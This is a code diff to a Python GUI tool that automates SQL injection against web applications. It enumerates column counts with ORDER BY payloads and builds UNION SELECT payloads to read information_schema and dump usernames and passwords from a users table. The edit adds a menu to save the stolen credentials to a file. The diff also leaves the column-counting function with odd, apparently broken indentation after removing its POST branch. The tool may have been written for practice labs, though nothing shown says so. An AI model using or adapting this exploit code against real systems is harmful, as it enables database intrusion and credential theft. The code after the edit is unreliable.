@@ -4,7 +4,7 @@ import urllib3
 from bs4 import BeautifulSoup
 import re
 import tkinter as tk
-from tkinter import messagebox, StringVar
+from tkinter import messagebox, StringVar, filedialog
 
 from diff import difference
 
@@ -62,47 +62,16 @@ def try_login(url, method,post_data):
 
 def exploit_sqli_column_number(url,method,post_data=None):
     if method == 'GET':
-        for i in range(1,50):
-            sql_payload = "'+order+by+%s--" %i
-            print(sql_payload)
-            r = requests.get(url + sql_payload, verify=False, proxies=proxies)
-            res = r.text
-            if r.status_code == 500:
-                if i-1 == 0:
-                    return "one column"
-                return i - 1
-            i = i + 1
-        return False
-    
-    elif method == 'POST':
-        try:
             for i in range(1,50):
                 sql_payload = "'+order+by+%s--" %i
-                post_data[list(post_data.keys())[0]] = sql_payload
                 print(sql_payload)
-                print(post_data)
-                r = requests.post(url ,data=post_data ,verify=False, proxies=proxies)
+                r = requests.get(url + sql_payload, verify=False, proxies=proxies)
                 if r.status_code == 500:
                     if i-1 == 0:
                         return "one column"
                     return i - 1
                 i = i + 1
-        except:
-            for i in range(1,50):
-                sql_payload = "'+order+by+%s#" %i
-                post_data[list(post_data.keys())[0]] = sql_payload
-                print(sql_payload)
-                print(post_data)
-                r = requests.post(url ,data=post_data ,verify=False, proxies=proxies)
-                if r.status_code == 500:
-                    if i-1 == 0:
-                        return "one column"
-                    return i - 1
-                i = i + 1
-            # return False
-
-
-
+    
 
 def exploit_sqli_string_field(url, num_col,method,post_data=None):
     if method == 'GET':
@@ -140,7 +109,7 @@ def generate_sql_payload(num_columns, text_column_index,detail,users_table=None)
     elif detail == "column_name":
         sql_payload = "' UNION SELECT " + ", ".join(null_columns) + " FROM information_schema.columns WHERE table_name = '%s'--" % users_table
     elif detail == "all":
-        null_columns[text_column_index - 1] = f"CONCAT({username_column}, '~~', {password_column})"
+        null_columns[text_column_index - 1] = f"CONCAT(username, '~~', password)"
         sql_payload = "' UNION SELECT " + ", ".join(null_columns) + " FROM users--"  #"  WHERE table_name = '%s'--" % users_table
     return sql_payload  
 
@@ -177,10 +146,12 @@ def exploit_sqli_users_columns(url, users_table, method, post_data,num_col,strin
     print(sql_payload)
     res = perform_request(url, sql_payload, method, post_data)
     soup = BeautifulSoup(res.text, 'html.parser')
-    global username_column
+
     username_column = soup.find(text=re.compile('.*username.*'))
-    global password_column
+
     password_column = soup.find(text=re.compile('.*password.*'))
+    print(password_column)
+    print(username_column)
     return username_column, password_column
 
 def exploit_sqli_user_cred(url, users_table, username_column, password_column, method='GET', post_data=None):
@@ -193,6 +164,12 @@ def exploit_sqli_user_cred(url, users_table, username_column, password_column, m
     output = difference(str(soup), str(soup2))
     return output
 
+def save_to_file(content):
+    file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
+    if file_path:
+        with open(file_path, 'w') as file:
+            file.write(content)
+        messagebox.showinfo("Save Successful", "Results saved to file.")
 
 
 def main():
@@ -252,12 +229,12 @@ def main():
                         result_text.insert(tk.END, "Found the username column name: %s\n" % username_column)
                         result_text.insert(tk.END, "Found the password column name: %s\n" % password_column)
 
-                        admin_password = exploit_sqli_user_cred(url, users_table, username_column, password_column, method, post_data)
-                        if admin_password:
+                        user_cred = exploit_sqli_user_cred(url, users_table, username_column, password_column, method, post_data)
+                        if user_cred:
                             result_text.insert(tk.END, "[+] The username and password are as below: \n")
-                            for value in admin_password:
+                            for value in user_cred:
                                 result_text.insert(tk.END, "[+] %s\n" % value)
-
+                            menu.add_command(label="Save to File", command=lambda: save_to_file('\n'.join(user_cred)))
                         else:
                             result_text.insert(tk.END, "Did not find the administrator password\n")
                     else:
@@ -297,6 +274,16 @@ def main():
 
     result_text = tk.Text(root, height=10, width=60)
     result_text.pack()
+
+    menu = tk.Menu(root)
+    root.config(menu=menu)
+    file_menu = tk.Menu(menu, tearoff=0)
+    menu.add_cascade(label="File", menu=file_menu)
+
+    file_menu.add_command(label="Exit", command=root.destroy)
+
+
+
 
     root.mainloop()
 
